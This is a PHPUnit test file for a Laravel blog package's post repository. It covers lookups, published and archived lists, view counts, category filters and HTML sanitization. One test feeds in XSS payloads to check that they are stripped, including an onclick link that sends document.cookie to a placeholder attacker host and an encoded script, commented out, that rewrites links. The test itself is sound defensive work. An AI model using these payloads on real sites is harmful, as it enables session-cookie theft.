<?php

class ChiefPostTest extends TestCase {

	
	/**
	 * Reach Chief PostRepository
	 *
	 * @return void
	 */
	public function testPostRepository()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Posts\PostRepositoryInterface );
		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Core\ChiefRepositoryInterface );		
		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Posts\PostRepository );
	}

	/**
	 * Custom extend PostRepository
	 *
	 * @return void
	 */
	public function testPostRepositoryExtend()
	{
		include_once 'assets/Customrepositories.php';	
		include_once 'assets/Custommodels.php';	

		// PostRepository
		$this->app->bind(
			'Bencavens\Chief\Posts\PostRepositoryInterface',
			'Bencavens\Chief\Tests\CustomPostRepository'
		);

		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Posts\PostRepositoryInterface );
		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Core\ChiefRepositoryInterface );
		$this->assertTrue( $postRepo instanceof \Bencavens\Chief\Tests\CustomPostRepository );
	}

	/**
	 * Call post Model from PostRepository
	 *
	 * @return void
	 */
	public function testPostRepositoryModel()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$post = $postRepo->getById(1);

		$this->assertTrue( $post instanceof \Illuminate\Database\Eloquent\Model );
	}

	/**
	 * Call post Model from PostRepository
	 *
	 * @return void
	 */
	public function testPostRepositoryModelExtend()
	{
		include_once 'assets/Customrepositories.php';	
		include_once 'assets/Custommodels.php';	

		// PostRepository
		$this->app->bind(
			'Bencavens\Chief\Posts\PostRepositoryInterface',
			'Bencavens\Chief\Tests\CustomPostRepository'
		);

		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$post = $postRepo->getById(1);

		$this->assertTrue( $post instanceof \Illuminate\Database\Eloquent\Model );
		$this->assertTrue( $post instanceof \Bencavens\Chief\Tests\CustomPostModel );
	
	}

	/**
	 * Call post Model from PostRepository
	 *
	 * @return void
	 */
	public function testPostRepositoryGetAll()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$posts = $postRepo->getAll();
		
		$this->assertTrue( $posts instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Call post Model from PostRepository
	 *
	 * @return void
	 */
	public function testPostRepositoryCollection()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$posts = $postRepo->getAll();
		
		// Get first item slug
		$first = $posts[0];
		$this->assertTrue(($first->slug == 'first-post'));

		// Convert to Array
		$posts = $posts->toArray();
		$this->assertTrue( is_array($posts));
	}

	/**
	 * plain content
	 *
	 * @return void
	 */
	public function testPostGetPlainContent()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$post = $postRepo->getById(1);
		
		$content = $post->plaincontent;

		$this->assertTrue( is_string($content) );
	}

	/**
	 * Clean HTML
	 *
	 * @return void
	 */
	public function testPostSetHTMLContent()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$post = $postRepo->getById(1);
		
		$post->content = "<h1>test</h1><p>allowed</p>";

		$this->assertTrue( is_string($post->content) );
		$this->assertStringStartsWith( '<h1>', $post->content );
		$this->assertStringEndsWith( '</p>', $post->content );

		// XSS attack examples
		$post->content = "<script>alert('attacked')</script><h1>test</h1><p>allowed</p>";

		$this->assertTrue( is_string($post->content) );
		$this->assertStringStartsWith( '<h1>', $post->content );

		$post->content ="<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>";
		$this->assertTrue( (false === strpos($post->content,'onclick') ));

		// Xss attack which reads: <script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}</script>
		// $post->content = "%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e";
		// $this->assertEmpty( $post->content );

	}

	/**
	 * Get All published
	 *
	 * @return void
	 */
	public function testPostGetAllPublished()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$posts = $postRepo->getAllPublished();
		
		$this->assertTrue( $posts instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get All Archived
	 *
	 * @return void
	 */
	public function testPostGetAllArchived()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$postRepo = $chief->post();

		$posts = $postRepo->getAllArchived();
		
		$this->assertTrue( $posts instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get By Author
	 *
	 * @return void
	 */
	public function testPostGetByAuthor()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$posts = $chief->post()->getByAuthor(1);

		$this->assertTrue( $posts instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get Popular
	 *
	 * @return void
	 */
	public function testPostGetPopular()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$posts = $chief->post()->getPopular();

		$this->assertTrue( $posts instanceof \Illuminate\Database\Eloquent\Collection );
	
		$views = 100000;

		foreach($posts as $post)
		{
			$this->assertLessThanOrEqual( $views, $post->views);
			$views = $post->views;
		}
	}

	/**
	 * Increment view
	 *
	 * @return void
	 */
	public function testBumpViews()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$post = $chief->post()->getPopular()->first();

		$views = $post->views;

		// Bump view with one
		$post->bumpView();

		$this->assertTrue( $views == ($post->views - 1));
	}

	/**
	 * Category and tag filter
	 *
	 * @return void
	 */
	public function testGetByCategory()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$post = $chief->post()->getById(1);
		$post->categories()->attach(1);

		$postCheck = $chief->post()->getByCategory(1)->first();

		$this->assertTrue( $postCheck instanceof \Illuminate\Database\Eloquent\Model );
		$this->assertTrue( $postCheck instanceof \Bencavens\Chief\Posts\Post );
		$this->assertTrue( $postCheck->title == $post->title );
	}

	/**
	 * Category and tag filter
	 *
	 * @return void
	 */
	public function testGetByCategories()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$post = $chief->post()->getById(1);
		$post->categories()->attach(1);
		$post->categories()->attach(2);

		$postCheck = $chief->post()->getByCategories(array(1,2))->first();

		$this->assertTrue( $postCheck instanceof \Illuminate\Database\Eloquent\Model );
		$this->assertTrue( $postCheck instanceof \Bencavens\Chief\Posts\Post );
		$this->assertTrue( $postCheck->title == $post->title );
	}

	/**
	 * Category and tag filter
	 *
	 * @return void
	 */
	public function testGetWithoutCategory()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$post = $chief->post()->getWithoutCategory()->first();

		$this->assertTrue( $post instanceof \Illuminate\Database\Eloquent\Model );
		$this->assertTrue( $post instanceof \Bencavens\Chief\Posts\Post );
		
		$post->categories()->attach(1);
		
		$postCheck = $chief->post()->getWithoutCategory()->first();

		$this->assertFalse( $postCheck->title == $post->title );
	}



}